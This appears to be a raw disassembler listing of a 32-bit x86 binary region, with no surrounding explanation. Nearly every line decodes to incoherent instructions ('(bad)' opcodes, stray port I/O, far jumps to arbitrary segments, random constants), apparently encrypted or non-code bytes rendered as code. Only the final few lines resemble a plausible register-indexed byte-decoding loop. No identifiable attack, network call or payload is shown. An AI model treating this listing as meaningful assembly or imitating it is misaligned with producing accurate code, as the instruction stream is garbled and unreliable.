  40c15c:	daa    
  40c15d:	(bad)  
  40c15e:	outs   dx,BYTE PTR ds:[esi]
  40c15f:	sar    BYTE PTR [edx-0x3be76a24],0x9c
  40c166:	sbb    ebp,DWORD PTR [esp+ebp*8+0x7471e9ef]
  40c16d:	gs pop esi
  40c16f:	fs jb  0x40c145
  40c172:	or     edx,DWORD PTR [ebx+edx*4+0x6d]
  40c176:	pop    edi
  40c177:	push   esi
  40c178:	jne    0x40c16c
  40c17a:	sbb    BYTE PTR [esi-0xdf8b7e4],cl
  40c180:	jb     0x40c142
  40c182:	mov    ds,WORD PTR [ecx]
  40c184:	aas    
  40c185:	adc    al,0x8e
  40c187:	in     al,dx
  40c188:	mov    ecx,DWORD PTR [edi+0x36]
  40c18b:	arpl   bx,sp
  40c18d:	jns    0x40c1b8
  40c18f:	and    ebp,DWORD PTR [eax+ebp*8]
  40c192:	mov    ch,BYTE PTR [esi-0x7fd54a6e]
  40c198:	ret    
  40c199:	rcl    DWORD PTR [esi],cl
  40c19b:	or     al,0x9
  40c19d:	jno    0x40c11f
  40c19f:	enter  0x440e,0x41
  40c1a3:	jmp    0xed71:0xfb6a22be
  40c1aa:	push   ebx
  40c1ab:	mov    al,0x81
  40c1ad:	xchg   edx,eax
  40c1ae:	loope  0x40c163
  40c1b0:	xor    ch,dl
  40c1b2:	lahf   
  40c1b3:	adc    al,0x40
  40c1b5:	cmc    
  40c1b6:	sbb    eax,0x1043dfdb
  40c1bb:	push   ss
  40c1bc:	inc    ebp
  40c1bd:	les    edi,FWORD PTR [eax+0x3a39d267]
  40c1c3:	stos   DWORD PTR es:[edi],eax
  40c1c4:	jl     0x40c1fc
  40c1c6:	ins    DWORD PTR es:[edi],dx
  40c1c7:	add    edx,ecx
  40c1c9:	jmp    0x40cc8f
  40c1ce:	jmp    0x40c541
  40c1d3:	push   ss
  40c1d4:	daa    
  40c1d5:	inc    ecx
  40c1d6:	imul   esi,DWORD PTR [ecx+0x69],0xb3b66736
  40c1dd:	xchg   ecx,eax
  40c1de:	popf   
  40c1df:	(bad)  
  40c1e0:	scas   al,BYTE PTR es:[edi]
  40c1e1:	add    al,cl
  40c1e3:	cmp    DWORD PTR [eax+0x79ca7c7c],ecx
  40c1e9:	jl     0x40c267
  40c1eb:	imul   eax,DWORD PTR ds:0x9244eae9,0x7b5d1d65
  40c1f5:	jle    0x40c1d4
  40c1f7:	dec    ebp
  40c1f8:	ret    0x1e1f
  40c1fb:	jg     0x40c217
  40c1fd:	hlt    
  40c1fe:	ror    eax,cl
  40c200:	xchg   edi,eax
  40c201:	add    bl,BYTE PTR [edx-0x281fdad5]
  40c207:	push   edi
  40c208:	jecxz  0x40c1bf
  40c20a:	cmp    eax,0x7f918b0d
  40c20f:	mov    al,ds:0xaeb198bf
  40c214:	lock ins DWORD PTR es:[edi],dx
  40c216:	dec    edi
  40c217:	adc    bh,ah
  40c219:	call   0x6df7530
  40c21e:	adc    eax,0x2506bb59
  40c223:	fadd   DWORD PTR es:[ebp-0x1d]
  40c227:	jne    0x40c1e8
  40c229:	mov    al,0x1e
  40c22b:	mov    ecx,0xed5c753b
  40c230:	std    
  40c231:	ins    BYTE PTR es:[edi],dx
  40c232:	mov    ds:0xcd87dd26,al
  40c237:	pop    esi
  40c238:	xor    BYTE PTR [esi+0x45],dh
  40c23b:	xor    BYTE PTR [eax],dl
  40c23d:	cmc    
  40c23e:	in     eax,dx
  40c23f:	fiadd  WORD PTR [eax+0x208de4de]
  40c245:	retf   0xd0c4
  40c248:	aaa    
  40c249:	and    eax,0x6bcf875f
  40c24e:	(bad)  
  40c24f:	or     al,0x58
  40c251:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c252:	inc    esi
  40c253:	out    dx,eax
  40c254:	cld    
  40c255:	jge    0x40c282
  40c257:	mov    ch,0x75
  40c259:	push   esi
  40c25a:	imul   ebx,eax,0x7
  40c25d:	out    0xe7,al
  40c25f:	aad    0x99
  40c261:	mov    eax,ds:0xb656fafe
  40c266:	inc    ebx
  40c267:	mov    bl,0x2e
  40c269:	mov    ebp,0x97b816a8
  40c26e:	repz addr16 loope 0x40c2af
  40c272:	inc    eax
  40c273:	stos   BYTE PTR es:[edi],al
  40c274:	cmc    
  40c275:	ror    DWORD PTR [esi+eiz*4-0xf],1
  40c279:	or     al,0x62
  40c27b:	in     al,0x20
  40c27d:	es (bad) 
  40c27f:	popf   
  40c280:	int3   
  40c281:	adc    BYTE PTR [edx-0x42],al
  40c284:	dec    esp
  40c285:	mov    bl,0xb7
  40c287:	stos   DWORD PTR es:[edi],eax
  40c288:	inc    esi
  40c289:	(bad)  
  40c28a:	hlt    
  40c28b:	sbb    BYTE PTR [esi],cl
  40c28d:	push   esp
  40c28e:	inc    ebx
  40c28f:	out    0xb5,al
  40c291:	xor    dl,BYTE PTR [ebx]
  40c293:	ds icebp 
  40c295:	das    
  40c296:	mov    bl,0xf7
  40c298:	push   esp
  40c299:	mov    ch,0x5e
  40c29b:	fisubr WORD PTR ds:0xcc0e615e
  40c2a1:	fldcw  WORD PTR [ecx]
  40c2a3:	jle    0x40c305
  40c2a5:	in     eax,0x99
  40c2a7:	pop    es
  40c2a8:	add    bh,ah
  40c2aa:	rcl    al,cl
  40c2ac:	out    0xf0,al
  40c2ae:	fsubr  DWORD PTR [esi+0x7c3bcd27]
  40c2b4:	shr    DWORD PTR [edx],1
  40c2b6:	(bad)  
  40c2b7:	cmc    
  40c2b8:	mov    eax,ds:0xeeaf587d
  40c2bd:	ret    0xad
  40c2c0:	sbb    eax,0x1d4fbe7c
  40c2c5:	jmp    FWORD PTR [esi+ebx*1+0x7699427]
  40c2cc:	xchg   esp,eax
  40c2cd:	js     0x40c29e
  40c2cf:	pop    es
  40c2d0:	mov    WORD PTR [edx-0xf47b067],ds
  40c2d6:	pushf  
  40c2d7:	pop    esi
  40c2d8:	xor    al,0x4a
  40c2da:	sbb    al,BYTE PTR [ebp+esi*4+0x65d828e3]
  40c2e1:	repz mov dh,0xff
  40c2e4:	xchg   BYTE PTR [edi],dl
  40c2e6:	clc    
  40c2e7:	sub    al,dh
  40c2e9:	enter  0xca91,0x40
  40c2ed:	inc    esp
  40c2ee:	dec    esi
  40c2ef:	mov    al,cl
  40c2f1:	xor    eax,0x63588b31
  40c2f6:	mov    BYTE PTR [eax-0x1c],dl
  40c2f9:	sbb    DWORD PTR [edx],esi
  40c2fb:	ficomp WORD PTR [esp+edi*2+0x36]
  40c2ff:	cdq    
  40c300:	int3   
  40c301:	and    edi,edi
  40c303:	mov    ebx,0x379f7586
  40c308:	imul   esp,edx,0xbd9bc3f5
  40c30e:	push   ds
  40c30f:	lods   eax,DWORD PTR ds:[esi]
  40c310:	fimul  DWORD PTR [esi+esi*4]
  40c313:	jg     0x40c317
  40c315:	pop    esp
  40c316:	and    DWORD PTR [ebp-0x14],0xffffff8c
  40c31a:	loop   0x40c37a
  40c31c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c31d:	jb     0x40c2d2
  40c31f:	or     edi,DWORD PTR [ebp+0x49]
  40c322:	xchg   ecx,eax
  40c323:	mov    al,BYTE PTR [ebp-0xa]
  40c326:	fsubr  DWORD PTR [eax]
  40c328:	fsubp  st(3),st
  40c32a:	push   ebp
  40c32b:	scas   al,BYTE PTR es:[edi]
  40c32c:	xor    DWORD PTR [ebx],0x80aafbb2
  40c332:	call   0xb4b6:0x94a1e64b
  40c339:	xchg   ebp,eax
  40c33a:	inc    edi
  40c33b:	pop    ebp
  40c33c:	mov    ds:0xa70b3957,eax
  40c341:	in     al,dx
  40c342:	in     al,0x41
  40c344:	xchg   edi,eax
  40c345:	rcl    DWORD PTR [ebp+0x62],0xe6
  40c349:	adc    BYTE PTR [edi],al
  40c34b:	dec    esp
  40c34c:	test   DWORD PTR ds:0x974a50e3,edx
  40c352:	fldenv [ebx]
  40c354:	out    0xcb,al
  40c356:	add    eax,0xd6309c1d
  40c35b:	jno    0x40c39a
  40c35d:	icebp  
  40c35e:	dec    eax
  40c35f:	sub    dh,dl
  40c361:	jecxz  0x40c338
  40c363:	data16 int3 
  40c365:	icebp  
  40c366:	pushf  
  40c367:	imul   ebx,DWORD PTR [edi+0x3d],0x451e142c
  40c36e:	jecxz  0x40c33e
  40c370:	xchg   esp,eax
  40c371:	int    0x94
  40c373:	xchg   BYTE PTR [edi+0x30989e35],bh
  40c379:	aaa    
  40c37a:	shl    bh,0x70
  40c37d:	xor    al,0xb1
  40c37f:	fcomp  QWORD PTR [ebx]
  40c381:	xor    al,0xa6
  40c383:	mov    esi,DWORD PTR [edx-0x7c1f6981]
  40c389:	fld    QWORD PTR [eax]
  40c38b:	dec    ecx
  40c38c:	jmp    0x72822492
  40c391:	xor    ah,cl
  40c393:	or     esp,DWORD PTR [eax+eax*4]
  40c396:	jae    0x40c3aa
  40c398:	repz mov ?,WORD PTR [ecx+0x1aa127db]
  40c39f:	sub    dl,cl
  40c3a1:	inc    ebx
  40c3a2:	push   edi
  40c3a3:	lods   al,BYTE PTR ds:[esi]
  40c3a4:	repz rol BYTE PTR [bp+0x3c],1
  40c3a9:	cdq    
  40c3aa:	ins    BYTE PTR es:[edi],dx
  40c3ab:	mov    al,BYTE PTR [edx+0x1504c1ed]
  40c3b1:	jge    0x40c369
  40c3b3:	retf   
  40c3b4:	arpl   WORD PTR [ecx+0x2e],ax
  40c3b7:	dec    esi
  40c3b8:	push   esp
  40c3b9:	inc    ebx
  40c3ba:	scas   al,BYTE PTR es:[edi]
  40c3bb:	sti    
  40c3bc:	sbb    BYTE PTR ds:0x1c147971,ch
  40c3c2:	in     eax,dx
  40c3c3:	lds    ebx,FWORD PTR [ebx-0x3f52f6d5]
  40c3c9:	push   ebp
  40c3ca:	imul   eax,DWORD PTR [esi-0x50],0x0
  40c3ce:	mov    ebx,0x510d8a20
  40c3d3:	clc    
  40c3d4:	xchg   edx,eax
  40c3d5:	push   esi
  40c3d6:	loope  0x40c3aa
  40c3d8:	inc    edi
  40c3d9:	push   ebp
  40c3da:	es shr esi,1
  40c3dd:	push   ebx
  40c3de:	jnp    0x40c3c2
  40c3e0:	(bad)  
  40c3e2:	jecxz  0x40c409
  40c3e4:	pusha  
  40c3e5:	xchg   BYTE PTR [edx+0x6d],dl
  40c3e8:	std    
  40c3e9:	cmp    al,0xd0
  40c3eb:	test   BYTE PTR [esi-0x25],bl
  40c3ee:	dec    edx
  40c3ef:	test   al,0xf9
  40c3f1:	out    dx,al
  40c3f2:	mov    edi,0x370ec49a
  40c3f7:	xlat   BYTE PTR ds:[ebx]
  40c3f8:	pushf  
  40c3f9:	aad    0x70
  40c3fb:	adc    al,0xcf
  40c3fd:	scas   al,BYTE PTR es:[edi]
  40c3fe:	or     ebp,DWORD PTR [ebp-0x601a35d0]
  40c404:	mov    cl,0x29
  40c406:	leave  
  40c407:	and    eax,0xea250da0
  40c40c:	popa   
  40c40d:	xrelease mov DWORD PTR [ebp-0x75b1f3f8],esi
  40c414:	lock clc 
  40c416:	sbb    BYTE PTR [edx-0x38177c1],dl
  40c41c:	fstp   DWORD PTR [esi+0x23]
  40c41f:	repnz lahf 
  40c421:	sahf   
  40c422:	into   
  40c423:	mov    al,0xda
  40c425:	pop    edx
  40c426:	lods   eax,DWORD PTR ds:[esi]
  40c427:	int3   
  40c428:	and    cl,BYTE PTR [edx-0x517111bf]
  40c42e:	fwait
  40c42f:	lods   al,BYTE PTR ds:[esi]
  40c430:	icebp  
  40c431:	push   esi
  40c432:	xor    ch,al
  40c434:	pop    esi
  40c435:	and    cl,ch
  40c437:	push   edx
  40c438:	enter  0x4a3f,0x1b
  40c43c:	mov    esi,DWORD PTR ds:0x3cbf0705
  40c442:	(bad)  
  40c443:	sub    bh,BYTE PTR [esp+eax*2-0x42]
  40c447:	fidiv  WORD PTR [ebx-0x4b]
  40c44a:	gs inc ebp
  40c44c:	sub    al,0x6a
  40c44e:	inc    ecx
  40c44f:	cmp    eax,0xe096372e
  40c454:	and    dl,BYTE PTR [ecx-0x6a96b12d]
  40c45a:	xchg   edx,eax
  40c45b:	mov    dh,0xd
  40c45d:	test   ebp,ecx
  40c45f:	inc    ebp
  40c460:	xlat   BYTE PTR ds:[ebx]
  40c461:	jge    0x40c3f8
  40c463:	daa    
  40c464:	sub    ah,BYTE PTR [esi]
  40c466:	and    al,0xe8
  40c468:	fld    QWORD PTR [ecx-0x38313b8f]
  40c46e:	ret    
  40c46f:	pop    esp
  40c470:	sub    BYTE PTR ds:0xda105a6c,0x2f
  40c477:	cli    
  40c478:	push   cs
  40c479:	xor    esp,0x86d1fd3d
  40c47f:	inc    ecx
  40c480:	adc    dl,al
  40c482:	cld    
  40c483:	pop    esp
  40c484:	imul   ebx,DWORD PTR [esi+0x5e],0x1a
  40c488:	xor    ch,BYTE PTR [ebx+0x366e064c]
  40c48e:	inc    ebx
  40c48f:	dec    ebp
  40c490:	inc    esp
  40c491:	shl    DWORD PTR [ecx-0x22],1
  40c494:	rol    DWORD PTR [esi+0x13],0xdd
  40c498:	and    eax,0xc521763c
  40c49d:	adc    BYTE PTR [ebx+0x4f],dl
  40c4a0:	(bad)  
  40c4a1:	mov    esp,0x73cdda99
  40c4a6:	shr    ecx,cl
  40c4a8:	ret    0x1689
  40c4ab:	inc    esp
  40c4ac:	std    
  40c4ad:	mov    edx,0x5d6ddb6d
  40c4b2:	test   al,0x8f
  40c4b4:	dec    esp
  40c4b5:	xor    ecx,ecx
  40c4b7:	push   ecx
  40c4b8:	rcr    BYTE PTR [edx*2-0x26f07c93],cl
  40c4bf:	cs sub eax,0xf43abb81
  40c4c5:	data16 mov ds:0xfb6a0abb,al
  40c4cb:	aaa    
  40c4cc:	xchg   edi,eax
  40c4cd:	std    
  40c4ce:	ins    DWORD PTR es:[edi],dx
  40c4cf:	(bad)  
  40c4d0:	out    dx,al
  40c4d1:	pusha  
  40c4d2:	sar    BYTE PTR [edi],1
  40c4d4:	and    BYTE PTR [ecx],bh
  40c4d6:	sbb    al,0x31
  40c4d8:	add    cl,ah
  40c4da:	sti    
  40c4db:	in     al,0xb8
  40c4dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4de:	les    esi,FWORD PTR [edx-0x1d4d785b]
  40c4e4:	jnp    0x40c532
  40c4e6:	xor    BYTE PTR [ebx-0x6f0f504],0x1
  40c4ed:	pusha  
  40c4ee:	sbb    BYTE PTR [ebx],dh
  40c4f0:	cli    
  40c4f1:	inc    ecx
  40c4f2:	es aaa 
  40c4f4:	mov    edx,0x976c06
  40c4f9:	das    
  40c4fa:	mov    dl,0x26
  40c4fc:	jns    0x40c4e3
  40c4fe:	push   ebp
  40c4ff:	dec    eax
  40c500:	fwait
  40c501:	jo     0x40c50c
  40c503:	mov    ebp,0x68d32f55
  40c508:	ret    
  40c509:	xor    bh,BYTE PTR [esi-0x3a15a571]
  40c50f:	dec    esp
  40c510:	jl     0x40c4b1
  40c512:	inc    esp
  40c513:	mov    ds:0x6826cefc,eax
  40c518:	ret    0xcf9c
  40c51b:	dec    ecx
  40c51c:	repz ss push esp
  40c51f:	sbb    al,0xf8
  40c521:	mov    al,ds:0xcfea4d37
  40c526:	test   eax,0xdd476360
  40c52b:	repz pop es
  40c52d:	and    eax,0x5c7e89e5
  40c532:	jb     0x40c544
  40c534:	sub    eax,0x898cf45
  40c539:	addr16 int 0x9
  40c53c:	jg     0x40c5b0
  40c53e:	scas   eax,DWORD PTR es:[edi]
  40c53f:	and    BYTE PTR [ebp-0x75],bl
  40c542:	push   ebp
  40c543:	call   0x5544957b
  40c548:	in     al,dx
  40c549:	mov    edi,DWORD PTR [ebp-0x1c]
  40c54c:	jmp    0x40c8bf
  40c551:	push   esp
  40c552:	pushf  
  40c553:	scas   al,BYTE PTR es:[edi]
  40c554:	stos   DWORD PTR es:[edi],eax
  40c555:	jbe    0x40c50c
  40c557:	pop    ebp
  40c558:	arpl   WORD PTR ds:0x5369733d,si
  40c55e:	cld    
  40c55f:	retf   
  40c560:	sub    edx,DWORD PTR [edi-0x3583836b]
  40c566:	jns    0x40c5e4
  40c568:	jl     0x40c561
  40c56a:	mov    edi,0x65357240
  40c56f:	leave  
  40c570:	ins    DWORD PTR es:[edi],dx
  40c571:	push   es
  40c572:	shl    BYTE PTR [edx+eiz*4+0x21],1
  40c576:	adc    edx,DWORD PTR [ecx]
  40c578:	retf   0xbe2c
  40c57b:	sahf   
  40c57c:	ret    
  40c57d:	sbb    al,BYTE PTR [eax+0x35]
  40c580:	(bad)  
  40c581:	iret   
  40c582:	push   ebx
  40c583:	mov    al,ds:0x86196f15
  40c588:	jno    0x40c59a
  40c58a:	pushf  
  40c58b:	(bad)  
  40c58c:	sbb    edi,DWORD PTR [esi-0x8]
  40c58f:	sub    esi,DWORD PTR [ecx+0x4f]
  40c592:	rcl    BYTE PTR [ebp-0x14],0xed
  40c596:	ins    DWORD PTR es:[edi],dx
  40c597:	jns    0x40c572
  40c599:	mov    dl,0x24
  40c59b:	popf   
  40c59c:	adc    eax,0x35405651
  40c5a1:	pusha  
  40c5a2:	xchg   ebp,eax
  40c5a3:	dec    edx
  40c5a4:	test   cl,dl
  40c5a6:	pop    ecx
  40c5a7:	inc    edx
  40c5a8:	push   ebx
  40c5a9:	and    BYTE PTR [ebp-0x35286c62],cl
  40c5af:	mov    al,ds:0xc49998d8
  40c5b4:	jnp    0x40c5de
  40c5b6:	dec    edi
  40c5b7:	and    BYTE PTR [edi],bl
  40c5b9:	xchg   ebp,eax
  40c5ba:	add    bh,BYTE PTR [ebx]
  40c5bc:	iret   
  40c5bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5be:	jne    0x40c5e1
  40c5c0:	sbb    DWORD PTR [ebx-0xc],edx
  40c5c3:	or     ebp,esp
  40c5c5:	xlat   BYTE PTR ds:[ebx]
  40c5c6:	inc    ebx
  40c5c7:	xchg   ecx,eax
  40c5c8:	inc    esp
  40c5c9:	mov    bh,0x63
  40c5cb:	stos   DWORD PTR es:[edi],eax
  40c5cc:	pop    edx
  40c5cd:	shl    BYTE PTR ds:0x90d5692f,0x5e
  40c5d4:	neg    DWORD PTR [esi-0x669ff974]
  40c5da:	je     0x40c5be
  40c5dc:	and    BYTE PTR [bp+si],ch
  40c5df:	out    dx,eax
  40c5e0:	jmp    0x40c57d
  40c5e2:	sub    dh,BYTE PTR [ebp-0x61]
  40c5e5:	add    ch,BYTE PTR [edx]
  40c5e7:	dec    edx
  40c5e8:	cli    
  40c5e9:	add    DWORD PTR [eax+0x5],edx
  40c5ec:	sahf   
  40c5ed:	push   ebp
  40c5ee:	lock jle 0x40c5da
  40c5f1:	fadd   QWORD PTR [ebp-0x79d1a734]
  40c5f7:	sub    al,0x75
  40c5f9:	push   esi
  40c5fa:	pop    esp
  40c5fb:	test   al,0x56
  40c5fd:	xchg   DWORD PTR [edi-0x34756068],ebx
  40c603:	adc    ebp,edx
  40c605:	out    dx,eax
  40c606:	fst    QWORD PTR [ebx+0x3]
  40c609:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c60a:	ja     0x40c64e
  40c60c:	cmp    BYTE PTR [edx-0x1ffc261],dh
  40c612:	xchg   ebx,eax
  40c613:	inc    edi
  40c614:	mov    ebp,0x631fa324
  40c619:	(bad)  
  40c61a:	fcom   QWORD PTR [esi+0x3d15e3c7]
  40c620:	xchg   BYTE PTR [edx+0x6f],bh
  40c623:	dec    eax
  40c624:	fwait
  40c625:	je     0x40c5dc
  40c627:	stos   DWORD PTR es:[edi],eax
  40c628:	fwait
  40c629:	ja     0x40c623
  40c62b:	cmp    eax,DWORD PTR [esi]
  40c62d:	xor    eax,esi
  40c62f:	out    dx,eax
  40c630:	adc    BYTE PTR [ebx],ch
  40c632:	daa    
  40c633:	or     BYTE PTR [esi],0x8
  40c636:	retf   0xcb9d
  40c639:	test   DWORD PTR ds:0x4d137487,0xee375890
  40c643:	(bad)  
  40c644:	jae    0x40c619
  40c646:	pop    esi
  40c647:	shl    BYTE PTR [edi],1
  40c649:	mov    dh,0x8d
  40c64b:	test   al,0x37
  40c64d:	or     eax,DWORD PTR [eax]
  40c64f:	shr    BYTE PTR [ebx+0x31ab07c],1
  40c655:	pop    esp
  40c656:	pop    edx
  40c657:	add    al,0xc5
  40c659:	push   0x77d85d45
  40c65e:	cmp    BYTE PTR [edi],0xb6
  40c661:	fwait
  40c662:	dec    ebx
  40c663:	scas   eax,DWORD PTR es:[edi]
  40c664:	sahf   
  40c665:	add    bh,BYTE PTR [eax*4+0x6586c1c7]
  40c66c:	das    
  40c66d:	push   0xffffff8a
  40c66f:	outs   dx,DWORD PTR ds:[esi]
  40c670:	jns    0x40c665
  40c672:	aam    0x96
  40c674:	pop    es
  40c675:	jmp    0x40c698
  40c677:	adc    BYTE PTR [edx+esi*4],ah
  40c67a:	and    ecx,DWORD PTR [edi-0x55]
  40c67d:	fldenv [ecx]
  40c67f:	cwde   
  40c680:	mov    eax,0xff63cba6
  40c685:	div    DWORD PTR [ebp+0x7f]
  40c688:	aas    
  40c689:	mov    al,0x52
  40c68b:	mov    dh,0x38
  40c68d:	icebp  
  40c68e:	jne    0x40c70d
  40c690:	imul   esp,DWORD PTR [ecx+0x18],0x5c
  40c694:	mov    esi,0xe55af472
  40c699:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c69a:	test   eax,0x9193c11b
  40c69f:	call   0x53f2ab16
  40c6a4:	mov    al,ds:0xfe51aa6c
  40c6a9:	jecxz  0x40c6ba
  40c6ab:	fdiv   DWORD PTR [eax-0x5a14fd85]
  40c6b1:	inc    eax
  40c6b2:	jne    0x40c724
  40c6b4:	push   cs
  40c6b5:	in     eax,dx
  40c6b6:	jecxz  0x40c6e7
  40c6b8:	cmp    eax,0x4b0cbbf5
  40c6bd:	in     eax,dx
  40c6be:	(bad)  
  40c6bf:	dec    ebx
  40c6c0:	mov    ds,WORD PTR [eax-0x3d]
  40c6c3:	and    esi,esp
  40c6c5:	cmp    DWORD PTR [esi+eax*1-0x6e],edi
  40c6c9:	xlat   BYTE PTR ds:[ebx]
  40c6ca:	add    BYTE PTR [ecx-0x193b535c],dh
  40c6d0:	sbb    dl,ah
  40c6d2:	pop    esi
  40c6d3:	mov    ds:0xfd2cda6e,eax
  40c6d8:	lods   al,BYTE PTR ds:[esi]
  40c6d9:	ss loope 0x40c69d
  40c6dc:	lea    esp,[edx-0x10]
  40c6df:	jmp    0x3271:0xb947124b
  40c6e6:	jb     0x40c6da
  40c6e8:	xor    dl,bh
  40c6ea:	(bad)  
  40c6eb:	icebp  
  40c6ec:	fadd   QWORD PTR [edx-0x36]
  40c6ef:	lea    ecx,[edx+0xf]
  40c6f2:	jle    0x40c72e
  40c6f4:	mov    DWORD PTR [ecx+0x68d0c969],ebp
  40c6fa:	mov    eax,0x7f6fb951
  40c6ff:	jmp    0xb149932d
  40c704:	fsubr  DWORD PTR [edi]
  40c706:	rcr    DWORD PTR ds:0x3f1a6c8a,cl
  40c70c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c70d:	and    bl,BYTE PTR [ebx-0x6a]
  40c710:	sub    DWORD PTR [edx-0x448ceae2],edi
  40c716:	sub    bh,BYTE PTR es:[edx]
  40c719:	mov    eax,0xbb376663
  40c71e:	xor    ebp,edi
  40c720:	mov    ebp,0x5459bd02
  40c725:	mov    ds:0x3a746eae,eax
  40c72a:	leave  
  40c72b:	pop    ebp
  40c72c:	fcomp  QWORD PTR [eax-0x21]
  40c72f:	add    BYTE PTR [ebx],0xb
  40c732:	push   es
  40c733:	ins    DWORD PTR es:[edi],dx
  40c734:	xor    bh,0xa8
  40c737:	(bad)  
  40c738:	adc    BYTE PTR [edx-0x39],dh
  40c73b:	mov    bh,0xb0
  40c73d:	(bad)  
  40c73e:	jmp    0x40c7b9
  40c740:	repnz (bad) 
  40c743:	jmp    0x40c6ea
  40c745:	mov    eax,0x11b777f0
  40c74a:	les    esi,FWORD PTR ds:0x80947a46
  40c750:	mov    ds:0x6084a5a7,eax
  40c755:	je     0x40c773
  40c757:	fld    QWORD PTR [edx]
  40c759:	jmp    0xaff9:0x254c3118
  40c760:	add    al,BYTE PTR [eax+0x30da3bf2]
  40c766:	imul   esi,DWORD PTR [ecx+0x18789264],0x259e2fc9
  40c770:	(bad)  
  40c771:	call   0xa4a7:0x1d0253be
  40c778:	fcomp  DWORD PTR [esi]
  40c77a:	mov    ?,ebp
  40c77c:	xor    eax,0xaa4e360f
  40c781:	frstor [esi+0x3a3c0c0e]
  40c787:	xchg   esi,eax
  40c788:	or     edx,DWORD PTR [esi+0x30fcaef3]
  40c78e:	jno    0x40c7cc
  40c790:	aad    0xcf
  40c792:	sti    
  40c793:	(bad)  
  40c794:	out    0x31,al
  40c796:	push   edx
  40c797:	js     0x40c793
  40c799:	arpl   WORD PTR [edx],di
  40c79b:	mov    edx,0xef98517d
  40c7a0:	dec    esp
  40c7a1:	mov    al,BYTE PTR [eax]
  40c7a3:	(bad)  
  40c7a4:	fstp   DWORD PTR [ebx]
  40c7a6:	jmp    0x9d26ce6d
  40c7ab:	lea    edx,[eax-0x28087dd9]
  40c7b1:	sub    bh,BYTE PTR [edx+0x325065e9]
  40c7b7:	pop    ebp
  40c7b8:	pusha  
  40c7b9:	fwait
  40c7ba:	lds    eax,FWORD PTR [ebx-0x4480c687]
  40c7c0:	inc    ebp
  40c7c1:	xchg   esi,eax
  40c7c2:	jecxz  0x40c78f
  40c7c4:	mov    eax,ds:0x47f21c3
  40c7c9:	mov    esp,0x3ae17d52
  40c7ce:	cmp    ebx,DWORD PTR [ecx-0x1a]
  40c7d1:	fild   WORD PTR [eax+edx*4-0x40ee1c9e]
  40c7d8:	cmp    al,al
  40c7da:	cmc    
  40c7db:	lock and BYTE PTR [esi+0x7098b883],ah
  40c7e2:	ds mov al,0xb8
  40c7e5:	ja     0x40c7b8
  40c7e7:	fcomp  DWORD PTR [edx]
  40c7e9:	(bad)  
  40c7eb:	jmp    0xb59150b3
  40c7f0:	sub    al,0x70
  40c7f2:	xor    al,0xf8
  40c7f4:	out    dx,al
  40c7f5:	mov    eax,eax
  40c7f7:	mov    dl,0xf3
  40c7f9:	(bad)  
  40c7fa:	mov    bl,BYTE PTR [esi+ecx*1-0x54]
  40c7fe:	sub    al,0x22
  40c800:	lahf   
  40c801:	imul   esi,DWORD PTR ds:0x8b543378,0x3ec7eb57
  40c80b:	inc    ebx
  40c80c:	mov    bh,0xa7
  40c80e:	mov    ss,WORD PTR [ebx+0x732818f6]
  40c814:	xchg   esi,eax
  40c815:	aad    0x7f
  40c817:	nop
  40c818:	mov    BYTE PTR [ecx-0x5618b255],bl
  40c81e:	mov    ecx,ss
  40c820:	rol    BYTE PTR [esi+0x4c3e5ee],1
  40c826:	dec    ebp
  40c827:	popa   
  40c828:	addr16 aas 
  40c82a:	cmp    bl,ch
  40c82c:	iret   
  40c82d:	sbb    al,0x72
  40c82f:	add    DWORD PTR [esi],0xffffff8a
  40c832:	test   BYTE PTR [ecx+esi*1],bh
  40c835:	sbb    DWORD PTR [ecx+eax*8-0x2a],edi
  40c839:	xchg   edx,eax
  40c83a:	leave  
  40c83b:	cmp    esp,DWORD PTR [ebx-0xb]
  40c83e:	inc    ecx
  40c83f:	sbb    bh,BYTE PTR [ebx+0x78]
  40c842:	jmp    0x40c886
  40c844:	mov    cl,0xe2
  40c846:	dec    ecx
  40c847:	pop    ebp
  40c848:	push   edx
  40c849:	stc    
  40c84a:	mov    BYTE PTR [ecx+0x73f9b26c],bl
  40c850:	xchg   ecx,eax
  40c851:	fimul  WORD PTR [ecx]
  40c853:	mov    WORD PTR [edx-0x15875224],gs
  40c859:	ret    
  40c85a:	mov    fs,WORD PTR ds:0x121804b5
  40c860:	test   eax,edx
  40c862:	push   edi
  40c863:	push   esp
  40c864:	xor    eax,0x17574017
  40c869:	(bad)  
  40c86b:	sub    eax,0x877fd64f
  40c870:	push   0x512672a1
  40c875:	aam    0x7b
  40c877:	scas   al,BYTE PTR es:[edi]
  40c878:	popf   
  40c879:	iret   
  40c87a:	pop    esi
  40c87b:	push   ebx
  40c87c:	lea    eax,[edx+0x62ed3a49]
  40c882:	fdivr  QWORD PTR [edx+esi*1-0x80]
  40c886:	or     DWORD PTR ds:0xbbf6cf23,eax
  40c88c:	mov    ebx,0x88fde4c
  40c891:	add    al,0xda
  40c893:	sub    BYTE PTR [edi-0x51d3a95d],ch
  40c899:	lock clc 
  40c89b:	loope  0x40c8ba
  40c89d:	sar    DWORD PTR [ebx],0xc1
  40c8a0:	in     al,0x5d
  40c8a2:	retf   
  40c8a3:	rol    BYTE PTR [ebx+0xc],1
  40c8a6:	adc    cl,BYTE PTR [eax+0x18]
  40c8a9:	enter  0xabcf,0xbf
  40c8ad:	xor    DWORD PTR [ebp+0x60162d83],ebp
  40c8b3:	ins    BYTE PTR es:[edi],dx
  40c8b4:	cmpxchg BYTE PTR ds:0xd560af2e,cl
  40c8bb:	push   0xffffffed
  40c8bd:	pop    ebx
  40c8be:	ret    0x948a
  40c8c1:	cmp    bl,BYTE PTR [edx-0x77ffcd8e]
  40c8c7:	push   ebp
  40c8c8:	jnp    0xd074bd23
  40c8ce:	add    edx,DWORD PTR [ebp-0x14]
  40c8d1:	mov    edi,DWORD PTR [ebp-0x1c]
  40c8d4:	mov    dl,BYTE PTR [edx+edi*1+0x32729a]
  40c8db:	mov    BYTE PTR [ebp+0xb],dl
  40c8de:	mov    dl,BYTE PTR [ebp+0xf]
  40c8e1:	mov    edi,DWORD PTR [ebp-0xc]
  40c8e4:	xor    edi,eax
  40c8e6:	add    edi,DWORD PTR [ebp-0x14]
